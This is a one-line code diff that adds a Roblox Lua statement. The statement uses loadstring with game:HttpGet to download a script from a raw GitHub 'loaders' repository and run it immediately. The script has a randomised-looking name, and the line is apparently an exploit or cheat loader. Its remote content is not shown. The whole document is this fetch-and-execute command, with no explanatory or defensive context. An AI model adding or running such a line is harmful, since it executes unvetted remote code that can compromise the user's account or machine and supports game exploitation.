@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BaseLizardFascinate/loaders/main/loaders/mukbang-game-testing-spam3-fimmul1tof67kp.lua"))()
